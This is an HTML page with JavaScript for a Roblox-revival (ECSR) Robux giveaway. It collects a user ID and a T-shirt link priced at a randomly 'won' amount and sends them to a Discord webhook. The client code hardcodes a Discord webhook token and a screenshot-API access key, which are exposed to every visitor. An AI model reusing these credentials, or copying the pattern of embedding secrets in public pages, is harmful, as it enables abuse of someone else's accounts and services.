<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ECSR Robux Giveaway</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f0f2f5; }
        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        input[type="text"] { width: 80%; padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; }
        button { background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #0056b3; }
        #profile-image { margin-top: 20px; border-radius: 4px; max-width: 100%; height: auto; }
        #message { margin-top: 15px; color: green; font-weight: bold; }
        #error { margin-top: 15px; color: red; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ECSR Robux Giveaway</h1>
        <p>Enter your Roblox User ID to participate:</p>
        <input type="text" id="robloxUserId" placeholder="Your Roblox User ID">
        <button id="participateButton">Participate</button>

        <div id="verificationStep" style="display: none;">
            <h2>Is this you?</h2>
            <img id="profile-image" src="" alt="Roblox Profile Image">
            <button id="yesButton">Yes, that's me!</button>
            <button id="noButton">No, wrong ID</button>
        </div>

        <div id="rouletteStep" style="display: none;">
            <h2>Spinning for Robux...</h2>
            <p id="rouletteResult"></p>
        </div>

        <div id="tshirtLinkStep" style="display: none;">
            <h2>You won <span id="wonRobuxAmount"></span> Robux!</h2>
            <p>Please provide a link to a Roblox T-Shirt (or shirt/pants) with the exact price of <span id="requiredPrice"></span> Robux.</p>
            <input type="text" id="tshirtLink" placeholder="T-Shirt Link">
            <button id="submitTshirt">Submit T-Shirt</button>
        </div>

        <div id="captchaStep" style="display: none;">
            <h2>Security Check</h2>
            <p>Please solve the following simple math problem:</p>
            <p id="captchaQuestion"></p>
            <input type="text" id="captchaAnswer" placeholder="Your answer">
            <button id="verifyCaptcha">Verify</button>
        </div>

        <div id="resultStep" style="display: none;">
            <h2>Giveaway Result</h2>
            <p id="finalMessage"></p>
            <p id="errorMessage"></p>
        </div>

        <p id="message"></p>
        <p id="error"></p>
    </div>

    <script>
        document.getElementById('participateButton').addEventListener('click', async () => {
            const userId = document.getElementById('robloxUserId').value;
            if (!userId) {
                document.getElementById('error').innerText = 'Please enter your Roblox User ID.';
                return;
            }
            document.getElementById('error').innerText = ''; // Clear previous errors

            // Show loading message
            document.getElementById('message').innerText = 'Fetching profile...';

            try {
            
                const imageUrl = `https://api.apiflash.com/v1/urltoimage?access_key=91aeaa0c407e4f089e1c49af78437242&url=https%3A%2F%2Fecsr.io%2Fusers%2F${userId}%2Fprofile&format=png&delay=8&response_type=image`;

                document.getElementById('profile-image').src = imageUrl;
                document.getElementById('verificationStep').style.display = 'block';
                document.getElementById('participateButton').style.display = 'none';
                document.getElementById('robloxUserId').style.display = 'none';
                document.getElementById('message').innerText = ''; // Clear loading message

                // Store userId for later use
                sessionStorage.setItem('currentUserId', userId);

            } catch (err) {
                document.getElementById('error').innerText = 'Failed to fetch profile image. Please try again.';
                console.error(err);
            }
        });

        document.getElementById('yesButton').addEventListener('click', () => {
            document.getElementById('verificationStep').style.display = 'none';
            document.getElementById('rouletteStep').style.display = 'block';
            spinRoulette();
        });

        document.getElementById('noButton').addEventListener('click', () => {
            document.getElementById('error').innerText = 'Please enter the correct User ID.';
            document.getElementById('verificationStep').style.display = 'none';
            document.getElementById('participateButton').style.display = 'block';
            document.getElementById('robloxUserId').style.display = 'block';
            document.getElementById('robloxUserId').value = ''; // Clear input
        });

        let wonRobux = 0;
        let requiredPrice = 0;

        function spinRoulette() {
            const resultDisplay = document.getElementById('rouletteResult');
            let counter = 0;
            const interval = setInterval(() => {
                const randomRobux = Math.floor(Math.random() * (100 - 10 + 1)) + 10;
                resultDisplay.innerText = `Spinning... ${randomRobux} Robux`;
                counter++;
                if (counter > 20) { // Simulate a few spins before stopping
                    clearInterval(interval);
                    wonRobux = Math.floor(Math.random() * (100 - 10 + 1)) + 10;
                    requiredPrice = wonRobux; // The price of the T-Shirt should be the won amount
                    resultDisplay.innerText = `You won ${wonRobux} Robux!`;
                    document.getElementById('rouletteStep').style.display = 'none';
                    document.getElementById('wonRobuxAmount').innerText = wonRobux;
                    document.getElementById('requiredPrice').innerText = requiredPrice;
                    document.getElementById('tshirtLinkStep').style.display = 'block';
                }
            }, 100);
        }

        document.getElementById('submitTshirt').addEventListener('click', async () => {
            const tshirtLink = document.getElementById('tshirtLink').value;
            if (!tshirtLink) {
                document.getElementById('error').innerText = 'Please enter a T-Shirt link.';
                return;
            }
            document.getElementById('error').innerText = '';

            // In a real scenario, you'd validate the link (e.g., check if it's a valid Roblox item link)
            // For this example, we proceed to captcha
            document.getElementById('tshirtLinkStep').style.display = 'none';
            startCaptcha();
        });

        let captchaCorrectAnswer;

        function startCaptcha() {
            const num1 = Math.floor(Math.random() * 10) + 1;
            const num2 = Math.floor(Math.random() * 10) + 1;
            captchaCorrectAnswer = num1 + num2;
            document.getElementById('captchaQuestion').innerText = `${num1} + ${num2} = ?`;
            document.getElementById('captchaStep').style.display = 'block';
        }

        document.getElementById('verifyCaptcha').addEventListener('click', async () => {
            const userAnswer = parseInt(document.getElementById('captchaAnswer').value);
            if (userAnswer === captchaCorrectAnswer) {
                document.getElementById('captchaStep').style.display = 'none';
                document.getElementById('message').innerText = 'Processing your claim...';
                await sendResultToWebhook();
            } else {
                document.getElementById('error').innerText = 'Incorrect answer. Please try again.';
            }
        });

        async function sendResultToWebhook() {
            const userId = sessionStorage.getItem('currentUserId');
            const tshirtLink = document.getElementById('tshirtLink').value;

            const webhookUrl = 'https://discord.com/api/webhooks/1375794166482731109/ap9CPfyxOh1s26wZe949QP96dpb53bynSP_8V7Aql6tagW0HW00hUPEatAurUPA3JPNg'; // yea not protected nga

            const payload = {
                "content": `ðŸŽ‰ Robux Giveaway Result ðŸŽ‰\n\n**User ID:** ${userId}\n**Won Robux:** ${wonRobux}\n**T-Shirt Link:** ${tshirtLink}\n**Required Price:** ${requiredPrice}\n\n**Profile Image:** https://api.apiflash.com/v1/urltoimage?access_key=91aeaa0c407e4f089e1c49af78437242&url=https%3A%2F%2Fecsr.io%2Fusers%2F${userId}%2Fprofile&format=png&delay=8&response_type=image`
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });

                if (response.ok) {
                    document.getElementById('message').innerText = ''; // Clear processing message
                    document.getElementById('finalMessage').innerText = 'Your claim has been submitted successfully! Please wait for your Robux.';
                    document.getElementById('resultStep').style.display = 'block';
                } else {
                    document.getElementById('message').innerText = ''; // Clear processing message
                    document.getElementById('errorMessage').innerText = 'Failed to submit claim. Please contact @w2mpu72_ on Discord.';
                    document.getElementById('resultStep').style.display = 'block';
                    console.error('Webhook error:', response.status, response.statusText);
                }
            } catch (err) {
                document.getElementById('message').innerText = ''; // Clear processing message
                document.getElementById('errorMessage').innerText = 'An error occurred. Please contact @w2mpu72_ on Discord.';
                document.error(err);
            }
        }
    </script>
</body>
</html>
